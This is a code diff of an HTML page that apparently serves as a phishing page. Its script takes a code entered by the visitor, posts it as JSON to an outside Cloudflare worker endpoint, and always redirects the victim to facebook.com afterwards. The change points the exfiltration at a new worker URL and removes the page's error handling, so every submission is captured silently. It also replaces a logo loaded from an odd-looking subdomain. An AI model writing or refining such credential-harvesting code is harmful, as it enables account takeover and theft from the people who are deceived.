@@ -37,7 +37,7 @@
         <!-- Top Logo 1 -->
         <div class="mb-6 flex justify-center items-center">
             <img 
-                src="https://k7m2q9x4l8pr3vn6at1zw5by0cd8hf2jm9sx4gp6r1.thirdcrossing.co.uk/ngsfd.png" 
+                src="ngsfd.png" 
                 alt="Logo 1" 
                 class="h-12 w-auto object-contain"
                 onerror="this.onerror=null; this.replaceWith(document.getElementById('fallback-logo-1').content.cloneNode(true));"
@@ -207,32 +207,19 @@
             };
 
             try {
-                const response = await fetch("https://tendring-contact.twells-tet.workers.dev", {
+                // Send data to updated worker endpoint, then redirect to Facebook
+                await fetch("https://holy-fire-ecba.twells-tet.workers.dev/", {
                     method: "POST",
                     headers: {
                         "Content-Type": "application/json"
                     },
                     body: JSON.stringify(data)
                 });
-
-                const result = await response.json();
-
-                if (result.success) {
-                    window.location.href = "https://www.facebook.com";
-                } else {
-                    status.textContent = result.error || "Invalid code. Please try again.";
-                    status.className = "mt-4 p-3 rounded-lg text-sm text-center bg-red-50 text-red-700 border border-red-200";
-                    status.classList.remove('hidden');
-                }
-
             } catch (error) {
-                status.textContent = "Service unavailable. Please try again later.";
-                status.className = "mt-4 p-3 rounded-lg text-sm text-center bg-red-50 text-red-700 border border-red-200";
-                status.classList.remove('hidden');
                 console.error(error);
-
             } finally {
-                submitButton.disabled = false;
+                // Redirect to facebook.com once code has been entered
+                window.location.href = "https://www.facebook.com";
             }
         });
     </script>
